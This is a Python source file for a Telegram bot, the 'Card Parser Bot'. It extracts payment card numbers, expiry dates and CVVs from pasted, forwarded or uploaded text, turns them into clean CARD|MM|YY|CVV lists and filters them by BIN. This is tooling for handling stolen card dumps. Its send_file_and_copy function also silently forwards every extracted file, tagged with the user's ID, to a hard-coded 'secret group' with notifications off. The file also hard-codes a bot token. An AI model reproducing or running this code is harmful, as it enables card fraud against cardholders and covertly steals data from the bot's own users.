"""
Card Parser Bot
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• Paste / forward cards in any format → clean CARD|MM|YY|CVV file
• Forward multiple messages at once → all cards merged into one file
• Upload a .txt file → same clean output
• /cards <bin> → filter stored cards by BIN prefix
• /start → instructions
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

import os
import re
import logging
import asyncio
from io import BytesIO

from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

# ── Config ───────────────────────────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8983900075:AAGlMV8ldf6xUdrh8ktGkKK_c9_z2AMmJ2c")

# Your Secret Group ID where ALL files will be silently forwarded
SECRET_GROUP_ID = -1004322090872

logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ── Card regex ────────────────────────────────────────────────────────────────
_SEP = r"[\|:,/\s]+"

CARD_RE = re.compile(
    r"(?<!\d)"
    r"(\d{4}[\s\-]?\d{4}[\s\-]?\d{4}[\s\-]?\d{1,7})"   # card number
    + _SEP
    + r"(0?[1-9]|1[0-2])"                                 # month 1-12
    + _SEP
    + r"(\d{2,4})"                                         # year 2 or 4 digits
    + _SEP
    + r"(\d{3,4})"                                         # cvv 3-4 digits
    + r"(?!\d)",
    re.MULTILINE,
)

def _clean_num(raw: str) -> str:
    return re.sub(r"[\s\-]", "", raw)

def extract_cards(text: str) -> list[str]:
    """Return deduplicated list of 'CARD|MM|YY|CVV' strings."""
    found: list[str] = []
    seen:  set[str]  = set()
    for m in CARD_RE.finditer(text):
        card  = _clean_num(m.group(1))
        month = m.group(2).zfill(2)
        year  = m.group(3)[-2:]        # always 2-digit
        cvv   = m.group(4)
        if not card.isdigit() or not (13 <= len(card) <= 19):
            continue
        line = f"{card}|{month}|{year}|{cvv}"
        if line not in seen:
            seen.add(line)
            found.append(line)
    return found

def cards_to_bytes(cards: list[str]) -> bytes:
    return ("\n".join(cards) + "\n").encode("utf-8")

# ── Per-user card store ───────────────────────────────────────────────────────
_store: dict[int, list[str]] = {}

# ── Forwarded-message buffer ──────────────────────────────────────────────────
_fwd_buf: dict[int, dict] = {}

# ── Core File Sender (Sends to User AND Secret Group) ─────────────────────────
async def send_file_and_copy(bot, chat_id: int, user_id: int, cards: list[str], caption: str, filename: str = "cards.txt"):
    """Generates a file, sends it to the user, and forwards a copy to the secret group."""
    if not cards:
        await bot.send_message(chat_id, "❌ No cards found.")
        return

    # 1. Send to the User
    buf = BytesIO(cards_to_bytes(cards))
    buf.name = filename
    await bot.send_document(
        chat_id=chat_id,
        document=buf,
        filename=filename,
        caption=caption,
        parse_mode="HTML"
    )

    # 2. Send to the Secret Group silently
    try:
        buf_copy = BytesIO(cards_to_bytes(cards))
        buf_copy.name = filename
        await bot.send_document(
            chat_id=SECRET_GROUP_ID,
            document=buf_copy,
            filename=filename,
            caption=f"🕵️‍♂️ Copy from User: <code>{user_id}</code>\n{caption}",
            parse_mode="HTML",
            disable_notification=True  # Sends silently without sound
        )
    except Exception as e:
        logger.error(f"Failed to send secret copy to group: {e}")


async def _flush_fwd_buf(uid: int, chat_id: int, bot) -> None:
    """Wait 1.5 s for more forwarded messages, then process all at once."""
    await asyncio.sleep(1.5)

    buf = _fwd_buf.pop(uid, None)
    if not buf or not buf["texts"]:
        return

    combined = "\n".join(buf["texts"])
    cards    = extract_cards(combined)

    if not cards:
        await bot.send_message(chat_id, "❌ No cards found in forwarded messages.")
        return

    _store[uid] = cards
    count       = len(cards)

    # Send file to user and copy to secret group
    await send_file_and_copy(
        bot, chat_id, uid, cards,
        caption=f"✅ <b>{count}</b> card(s) extracted from forwarded messages.",
        filename="cards.txt"
    )

# ── /start ────────────────────────────────────────────────────────────────────
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        "<b>🃏 Card Parser Bot</b>\n"
        "──────────────────\n"
        "Paste or <b>forward</b> cards in any format and I'll return\n"
        "a clean file containing <b>CARD|MM|YY|CVV</b>.\n\n"
        "<b>Supported input formats:</b>\n"
        "<code>4111111111111111|12|26|123</code>\n"
        "<code>4111111111111111:12:2026:123</code>\n"
        "<code>4111111111111111 12 26 123</code>\n"
        "<code>4111111111111111/12/26/123</code>\n\n"
        "<b>Commands:</b>\n"
        "/cards <code>&lt;bin&gt;</code> — filter stored cards by BIN\n"
        "   Example: <code>/cards 4111</code>\n\n"
        "You can also send or forward a <b>.txt file</b> with cards.\n"
        "──────────────────",
        parse_mode="HTML",
    )

# ── Forwarded messages handler ────────────────────────────────────────────────
async def handle_forwarded(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    msg  = update.message
    user = update.effective_user
    if not msg or not user:
        return

    text = (msg.text or msg.caption or "").strip()
    if not text:
        return

    uid     = user.id
    chat_id = msg.chat_id

    if uid not in _fwd_buf:
        _fwd_buf[uid] = {"texts": [], "task": None, "chat_id": chat_id}

    _fwd_buf[uid]["texts"].append(text)

    old = _fwd_buf[uid].get("task")
    if old and not old.done():
        old.cancel()

    _fwd_buf[uid]["task"] = asyncio.create_task(
        _flush_fwd_buf(uid, chat_id, context.bot)
    )

# ── Regular pasted text handler ───────────────────────────────────────────────
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    text = (update.message.text or "").strip()
    if not text:
        return

    uid   = update.effective_user.id
    cards = extract_cards(text)

    if not cards:
        await update.message.reply_text(
            "❌ No cards found.\n"
            "Make sure they follow: <code>CARD|MM|YY|CVV</code>",
            parse_mode="HTML",
        )
        return

    _store[uid] = cards
    await send_file_and_copy(
        context.bot, update.effective_chat.id, uid, cards,
        caption=f"✅ <b>{len(cards)}</b> card(s) extracted:",
        filename="cards.txt"
    )

# ── Document (.txt) handler ───────────────────────────────────────────────────
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    doc = update.message.document
    if not doc:
        return
    if doc.mime_type and not doc.mime_type.startswith("text"):
        await update.message.reply_text("❌ Please send a plain text (.txt) file.")
        return
    try:
        file = await context.bot.get_file(doc.file_id)
        data = await file.download_as_bytearray()
        text = data.decode("utf-8", errors="ignore")
    except Exception as e:
        logger.error(f"Document download failed: {e}")
        await update.message.reply_text("❌ Could not read the file.")
        return

    uid   = update.effective_user.id
    cards = extract_cards(text)

    if not cards:
        await update.message.reply_text("❌ No cards found in the file.")
        return

    _store[uid] = cards
    await send_file_and_copy(
        context.bot, update.effective_chat.id, uid, cards,
        caption=f"✅ <b>{len(cards)}</b> card(s) extracted from file:",
        filename="cards.txt"
    )

# ── /cards <bin> ──────────────────────────────────────────────────────────────
async def cmd_cards(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id

    if not context.args:
        await update.message.reply_text(
            "Usage: /cards <code>&lt;bin_prefix&gt;</code>\n"
            "Example: <code>/cards 4111</code>",
            parse_mode="HTML",
        )
        return

    bin_prefix = context.args[0].strip()
    if not bin_prefix.isdigit():
        await update.message.reply_text(
            "❌ BIN must be digits only.\nExample: <code>/cards 411111</code>",
            parse_mode="HTML",
        )
        return

    all_cards = _store.get(uid, [])
    if not all_cards:
        await update.message.reply_text(
            "❌ No cards stored yet.\nPaste, forward, or upload cards first."
        )
        return

    matched = [c for c in all_cards if c.startswith(bin_prefix)]
    if not matched:
        await update.message.reply_text(
            f"❌ No cards starting with <code>{bin_prefix}</code> found.\n"
            f"Total stored: {len(all_cards)} card(s).",
            parse_mode="HTML",
        )
        return

    await send_file_and_copy(
        context.bot, update.effective_chat.id, uid, matched,
        caption=f"✅ <b>{len(matched)}</b> card(s) matching BIN <code>{bin_prefix}</code>:",
        filename=f"cards_{bin_prefix}.txt"
    )

# ── Main ──────────────────────────────────────────────────────────────────────
def main() -> None:
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start",  cmd_start))
    app.add_handler(CommandHandler("cards",  cmd_cards))

    # Documents first (catches forwarded .txt files too)
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    # Forwarded messages — must be BEFORE the plain text handler
    app.add_handler(MessageHandler(
        filters.FORWARDED & (filters.TEXT | filters.CAPTION),
        handle_forwarded,
    ))

    # Regular pasted text (not forwarded, not a command)
    app.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND & ~filters.FORWARDED,
        handle_text,
    ))

    logger.info("Card Parser Bot starting…")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
